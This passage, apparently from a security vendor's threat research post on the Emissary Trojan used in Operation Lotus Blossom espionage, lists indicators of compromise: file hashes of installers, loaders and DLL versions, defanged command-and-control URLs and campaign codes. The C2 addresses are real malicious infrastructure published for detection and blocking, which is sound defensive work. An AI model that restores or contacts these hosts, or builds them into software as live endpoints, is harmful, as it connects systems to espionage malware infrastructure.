<p>f36b7f63f46ae6afe8882b34c1ec11597c8537a3a7fa8b6521a83308940cc77b</p>
<h4>Emissary Installers/Loaders</h4>
<p>fdcd10a2c2bf802ba5b6be55c16c0bf407bcbee902b66466b0f954d2951fad2d</p>
<p>da29b647411153b49cbf4df862e3f36209eafb8ebe8b966429edec4fb15dbce9</p>
<p>721676d529a0c439594502f1d53fec697adc80fa1301d2bf20c2600d99ceed4e</p>
<p>0069029ee4029df88f700da335a06e0e3a534a94552fe966186166b526a20b6a</p>
<p>9420017390c598ee535c24f7bcbd39f40eca699d6c94dc35bcf59ddf918c59ab</p>
<p>26e2f4f9026f19156a73ffbfde438916f24d80b8812b6cebe98167eb9be0863c</p>
<p>8e3b7dc3dca92d7458265e2bcd69caa558cbbf24bbbf1200b9aa924260c42480</p>
<p>e817610b62ccd00bdfc9129f947ac7d078d97525e9628a3aa61027396dba419b</p>
<p>02831316a3a04c1248605f28fb08d810230dd4411b2a1fc8187508aea6b449c5</p>
<p>675869fac21a94c8f470765bc6dd15b17cc4492dd639b878f241a45b2c3890fc</p>
<p>70561f58c9e5868f44169854bcc906001947d98d15e9b4d2fbabd1262d938629</p>
<p>925d2f960d8db0510f3681c038311c0c2df86c5ba03f8cb61e3c8846c31bd6e1</p>
<p>98fb1d2975babc18624e3922406545458642e01360746870deee397df93f50e0</p>
<p>a8b0d084949c4f289beb4950f801bf99588d1b05f68587b245a31e8e82f7a1b8</p>
<p>b07fbb92484fd2aff6d28f0ab04d5f51e96420b6d670f921b0bbe0e5392da408</p>
<p>c72b07f2a423abc4fc45dfddc5162b8eb1ea97d5b5e66811526433f09b6cdf41</p>
<p>dd8ffb9f961299f7cc9cb51e17a5cccf79b7fb583e594b05ef93b54c8cad54f6</p>
<p>fbcb401cf06326ab4bb53fb9f01f1ca647f16f926811ea66984f1a1b8cf2f7bb</p>
<p>e21b47dfa9e250f49a3ab327b7444902e545bed3c4dcfa5e2e990af20593af6d</p>
<h4>Emissary DLL Version 1.0 through 5.4</h4>
<p>a7d07b92e48876e2195e5d8769a47cf0a237e11ac304e41b14fc36042b0d9484</p>
<p>e6c4611b1399ada920730686395d6fc1700fc39add3d0d40b4f784ccb6ad0c30</p>
<p>931a1284b11a3997c7a99076d582ed3436aa30409dc73bd763436dddd490f9cb</p>
<p>5edf2d0270f8e7eb5be3476802e46c578c4afc4b046411be0806b9acc3bfa099</p>
<p>9dab2d1b16eb0fb4ec2095d4b4e2a3ad67a707ab4f54f9c26539619691f103f3</p>
<p>dcbeca8c92d6d18f2faf385e677913dc8abac3fa3303c1f5cfe166180cffbed3</p>
<p>5171c9a593389011da4d72125e52bf7ef86b2da7fcd6c2a2bc95467afe6a1b58</p>
<p>70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a</p>
<p>c145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634</p>
<p>375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d</p>
<p>e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538</p>
<p>29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051</p>
<p>46ad72811990c1937d26e1f80ec1b9def8c112817f4bb9f94e3d1e4f0fb86f80</p>
<p>bfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636</p>
<p>731cd2ce87f4c4375782de0686b5b16619f8fa2de188522cbc8e64f8851bb7ed</p>
<p>acf7dc5a10b00f0aac102ecd9d87cd94f08a37b2726cb1e16948875751d04cc9</p>
<h4>Emissary C2 URLs</h4>
<p>http://101.55.121[.]79/lightserver/Default.aspx<br />
http://101.55.33[.]92/default.aspx<br />
http://101.55.33[.]92:80/default.aspx<br />
http://101.55.33[.]95:80/default.aspx<br />
http://103.243.24[.]179/Default.aspx<br />
http://118.193.221[.]233:80/default.aspx<br />
http://123.1.159[.]153/lightserver/Default.aspx<br />
http://123.1.159[.]210/lightserver/Default.aspx<br />
http://140.131.39[.]11/icanxp/help/help/default.aspx<br />
http://163.20.127[.]27/0test/test/default.aspx<br />
http://203.124.14[.]214/default.aspx<br />
http://203.124.14[.]229/default.aspx<br />
http://210.209.121[.]31/lightserver/default.aspx<br />
http://210.209.121[.]92/lightserver/Default.aspx<br />
http://210.209.121[.]92/weboffice/Default.aspx<br />
http://appletree.onthenetas[.]com/Default.aspx<br />
http://bluefield.byinter[.]net/lightserver/Default.aspx<br />
http://booking.passinggas[.]net/lightserver/Default.aspx<br />
http://chairman.OnTheNetAs[.]com/weboffice/Default.aspx<br />
http://dnt5b.myfw[.]us/Default.aspx<br />
http://dnt5b.myfw[.]us/default.aspx<br />
http://eventlog.findhere[.]org/Default.aspx<br />
http://grassland.OnTheNetAs[.]com/lightserver/Default.aspx<br />
http://groupspace.findhere[.]org/lightserver/Default.aspx<br />
http://photograph.myfw[.]us/lightserver/default.aspx<br />
http://ustar5.PassAs[.]us/Default.aspx<br />
http://ustar5.PassAs[.]us/default.aspx<br />
http://webonline.OnTheNetAs[.]com/lightserver/default.aspx<br />
http://www.danangqt[.]net:80/default.aspx<br />
http://zooboo.PassingGas[.]net/weboffice/Default.aspx</p>
<h4>Emissary Campaign Codes</h4>
<p>3test<br />
FJ201508<br />
lyk_WW<br />
A-1117a<br />
QPR-Z0330<br />
YUIO<br />
ZGP-M<br />
xman<br />
A-1117a<br />
Flash<br />
FJ20151125<br />
YUIO<br />
ll<br />
A-1231a<br />
ux-2011<br />
RT101212<br />
111<br />
UPG-ZHG-01<br />
IC00001</p>
      
              </div>
              <!--<span class="post__date">Updated 1 November, 2018 at 12:04 PM PDT</span>-->
              <button class="l-btn back-to-top" id="backToTop" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:back to top">Back to top</button>
              
			<div class="be__tags-wrapper"> 
				<h3>Tags</h3><ul role="list"><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/cyber-espionage/" role="link" title="cyber espionage" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:tags:cyber espionage">Cyber espionage</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/cybersecurity/" role="link" title="cybersecurity" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:tags:cybersecurity">Cybersecurity</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/elise/" role="link" title="Elise" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:tags:Elise">Elise</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/emissary/" role="link" title="Emissary" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:tags:Emissary">Emissary</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/espionage/" role="link" title="Espionage" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:tags:Espionage">Espionage</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/lotus-blossom/" role="link" title="Lotus Blossom" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:tags:Lotus Blossom">Lotus Blossom</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/trojans/" role="link" title="Trojans" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:tags:Trojans">Trojans</a></li></ul>
			</div> 
              <div class="be__post-nav">
    <a class="prev" href="https://unit42.paloaltonetworks.com" role="link" title="Threat Research" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:article-nav:Threat Research Center"> 
        <span>Threat Research Center</span>
    </a>
            <a class="next" href="https://unit42.paloaltonetworks.com/spidermal-deep-passivedns-analysis-with-maltego/" role="link" title="SpiderMal: Deep PassiveDNS Analysis with Maltego" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:article-nav:SpiderMal: Deep PassiveDNS Analysis with Maltego"> 
            <span>Next: SpiderMal: Deep PassiveDNS Analysis with Maltego</span>
        </a>
    </div>
 
            </div>
            <div class="be__nav">
            <div class="be__nav-wrapper">
      <div class="be-table-of-contents" data-toc-track="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:sidebar:table-of-contents">
      <div class="be-title__wrapper">
        <h3>Table of Contents</h3>
      </div> 
            <ul>
        <li></li>
      </ul>
    </div>
   
        <div class="be-related-articles">
        <h3>Related Articles</h3>
        <ul> 
                        <li>
                  <a href="https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:sidebar:related-articles:Chinese APT Abuses VSCode to Target Government in Asia">
                      Chinese APT Abuses VSCode to Target Government in Asia                  </a>
              </li>
                            <li>
                  <a href="https://unit42.paloaltonetworks.com/chinese-apts-target-asean-entities/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:sidebar:related-articles:ASEAN Entities in the Spotlight: Chinese APT Group Targeting">
                      ASEAN Entities in the Spotlight: Chinese APT Group Targeting                  </a>
              </li>
                            <li>
                  <a href="https://unit42.paloaltonetworks.com/apt41-using-new-speculoos-backdoor-to-target-organizations-globally/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:sidebar:related-articles:APT41 Using New Speculoos Backdoor to Target Organizations Globally">
                      APT41 Using New Speculoos Backdoor to Target Organizations Globally                  </a>
              </li>
                      </ul>
      </div>
      </div> 
            </div>
          </div>
        </div>
          <div class="pa related-threat">
    <div class="l-container">
            <h2>Related Malware Resources</h2>
      <div class="blog-slider" id="blogSlider"> 
                    <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Nation-State-cyberattacks_1920x900-786x368.jpg" class="attachment-medium size-medium" alt="Pictorial representation of a campaign like Contagious Interview. Digital graphic of a glowing globe with network connections and data streams, symbolizing global connectivity and technology advancements." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Nation-State-cyberattacks_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Nation-State-cyberattacks_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Nation-State-cyberattacks_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Nation-State-cyberattacks_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/10/03_Nation-State-cyberattacks_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware:Threat Research"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                  <a href="https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware">
                    <h4 class="post-title">Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/north-korea/" title="North Korea" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware:North Korea">North Korea</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/social-engineering/" title="social engineering" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware:social engineering">Social engineering</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/python/" title="Python" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware:Python">Python</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/" title="Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider"  data-card-link="https://unit42.paloaltonetworks.com/machine-learning-new-swiss-army-suite-tool/" data-video-cta-tracking="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning:card:video-modal:Read the article" data-video-title="Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning">
              <div class="card-media has-video" data-video="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Tutorial_Category_1505x922.jpg">
                              <figure>
                <img width="718" height="440" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Tutorial_Category_1505x922-718x440.jpg" class="attachment-medium size-medium" alt="A pictorial representation of machine learning detecting vulnerability scanning. A Black man using a tablet with a background of illuminated city buildings at night." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Tutorial_Category_1505x922-718x440.jpg 718w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Tutorial_Category_1505x922-1143x700.jpg 1143w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Tutorial_Category_1505x922-768x470.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Tutorial_Category_1505x922.jpg 1505w" sizes="(max-width: 718px) 100vw, 718px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning:Threat Research"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                  <a href="https://unit42.paloaltonetworks.com/machine-learning-new-swiss-army-suite-tool/" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning">
                    <h4 class="post-title">Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/machine-learning/" title="Machine Learning" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning:Machine Learning">Machine Learning</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/machine-learning-new-swiss-army-suite-tool/" title="Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Detecting Vulnerability Scanning Traffic From Underground Tools Using Machine Learning:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/06_Malware_Category_1920x900-786x368.jpg" class="attachment-medium size-medium" alt="Pictorial representation of keylogger malware like KLogEXE and FPSpy. Person working on a laptop with lines of code displayed on the screen, with a blurred effect indicating motion or activity, surrounded by a vivid blue and red lighting." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/06_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/06_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/06_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/06_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/06_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-actor-groups/" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy:Threat Actor Groups"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/threat-actor-groups.svg" alt=" category icon">Threat Actor Groups</span></a>                  <a href="https://unit42.paloaltonetworks.com/kimsuky-new-keylogger-backdoor-variant/" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy">
                    <h4 class="post-title">Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/mitre/" title="MITRE" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy:MITRE">MITRE</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/keylogger/" title="Keylogger" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy:Keylogger">Keylogger</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/north-korea/" title="North Korea" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy:North Korea">North Korea</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/kimsuky-new-keylogger-backdoor-variant/" title="Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Unraveling Sparkling Pisces’s Tool Set: KLogEXE and FPSpy:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Malware_Category_1920x900-786x368.jpg" class="attachment-medium size-medium" alt="Pictorial representation of SnipBot. Digital abstract background featuring binary code and technology symbols with a blue glow in the shape of a skull." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/01_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Inside SnipBot: The Latest RomCom Malware Variant:Threat Research"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                  <a href="https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Inside SnipBot: The Latest RomCom Malware Variant">
                    <h4 class="post-title">Inside SnipBot: The Latest RomCom Malware Variant</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/backdoor/" title="backdoor" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Inside SnipBot: The Latest RomCom Malware Variant:backdoor">Backdoor</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/romcom/" title="RomCom" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Inside SnipBot: The Latest RomCom Malware Variant:RomCom">RomCom</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/" title="Inside SnipBot: The Latest RomCom Malware Variant" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Inside SnipBot: The Latest RomCom Malware Variant:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/08_Security-Technology_Category_1920x900-786x368.jpg" class="attachment-medium size-medium" alt="A pictorial representation of a red team tool like Splinter. A digital illustration showing a 3D brain model surrounded by rising data columns on a circuit board, representing advanced artificial intelligence technology." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/08_Security-Technology_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/08_Security-Technology_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/08_Security-Technology_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/08_Security-Technology_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/09/08_Security-Technology_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool:Threat Research"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                  <a href="https://unit42.paloaltonetworks.com/analysis-pentest-tool-splinter/" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool">
                    <h4 class="post-title">Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/red-teaming-tool/" title="red teaming tool" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool:red teaming tool">Red teaming tool</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/pentest-tool/" title="pentest tool" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool:pentest tool">Pentest tool</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/analysis-pentest-tool-splinter/" title="Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Discovering Splinter: A First Look at a New Post-Exploitation Red Team Tool:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/word-image-449925-135181-16-786x368.png" class="attachment-medium size-medium" alt="Pictorial representation of APT groups from North Korea. The silhouette of two fish and the Pisces constellation inside an orange abstract planet, surrounded by two larger blue fish. Abstract, stylized cosmic setting with vibrant blue and purple shapes, representing space and distant planetary bodies." decoding="async" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/word-image-449925-135181-16-786x368.png 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/word-image-449925-135181-16-1493x700.png 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/word-image-449925-135181-16-768x360.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/word-image-449925-135181-16-1536x720.png 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/word-image-449925-135181-16.png 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-actor-groups/" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors:Threat Actor Groups"><span class=""><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/threat-actor-groups.svg" alt=" category icon">Threat Actor Groups</span></a>                  <a href="https://unit42.paloaltonetworks.com/gleaming-pisces-applejeus-poolrat-and-pondrat/" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors">
                    <h4 class="post-title">Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/python/" title="Python" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors:Python">Python</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/cryptocurrency/" title="Cryptocurrency" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:related-resources:Gleaming Pisces Poisoned Python Packages Campaign Delivers PondRAT Linux and MacOS Backdoors:Cryptocurrency">Cryptocurrency</a>
				</li>
				<li role="listitem">
